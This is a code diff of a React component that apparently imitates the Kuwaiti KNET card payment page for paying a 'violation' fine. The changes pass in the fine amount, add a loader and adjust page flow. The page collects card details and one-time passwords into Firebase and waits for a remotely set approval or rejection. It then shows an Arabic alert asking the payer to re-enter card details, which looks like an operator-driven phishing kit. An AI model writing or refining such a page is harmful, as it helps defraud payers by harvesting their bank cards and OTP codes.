@@ -2,7 +2,7 @@
 import { useEffect, useState } from "react";
 import "./kent.css";
 import { doc, onSnapshot, updateDoc } from "firebase/firestore";
-import { db, handlePay } from "../firebase";
+import {  db, handlePay } from "../firebase";
 import FullPageLoader from "../loader1";
 type PaymentInfo = {
   createdDate?: string;
@@ -142,7 +142,7 @@ const BANKS = [
   },
 ];
 
-export default function Kent(props: { setPage?: any }) {
+export default function Kent(props: { setPage?: any; violationValue: number }) {
   const [step, setstep] = useState(1);
   const [total, setTotal] = useState("");
   const [loading, setLoading] = useState(false);
@@ -172,13 +172,10 @@ export default function Kent(props: { setPage?: any }) {
     prefix: "",
     status: "new",
   });
-  const handleNewpage = () => {
-    handleUpdatePage("knet");
-  };
+
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
     if (newotp.length > 2) {
-      handleNewpage();
     }
   };
   useEffect(() => {
@@ -196,7 +193,7 @@ export default function Kent(props: { setPage?: any }) {
             if (data.status === "approved") {
               setstep(2);
               setLoading(false);
-              data.page === "o";
+              data.page === "";
             } else if (data.status === "rejected") {
               setLoading(false);
               alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
@@ -221,6 +218,7 @@ export default function Kent(props: { setPage?: any }) {
       }}
       dir="ltr"
     >
+      <FullPageLoader isLoading={loading}/>
       <form
         onSubmit={(e) => {
           e.preventDefault();
@@ -254,10 +252,7 @@ export default function Kent(props: { setPage?: any }) {
                   <div className="row">
                     <label className="column-label">Amount: </label>
                     <label className="column-value text-label">
-                      {localStorage.getItem("vv") === "0"
-                        ? 5
-                        : localStorage.getItem("vv")}{" "}
-                      kd
+                      {props.violationValue === 0 ? 5 : props.violationValue} kd
                     </label>
                   </div>
                 </div>
@@ -662,14 +657,14 @@ export default function Kent(props: { setPage?: any }) {
                             //     handleOArr(paymentInfo.otp!);
                             handlePay(paymentInfo, setPaymentInfo);
                             setTimeout(() => {
-                              setLoading(false);
-                              setTimeout(() => {}, 2000);
+                             
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
                                 status: "approved",
                               });
-                              props.setPage("phone");
+                              setLoading(false);
+                              handleUpdatePage('phone')
                             }, 3000);
                           }
                         }}
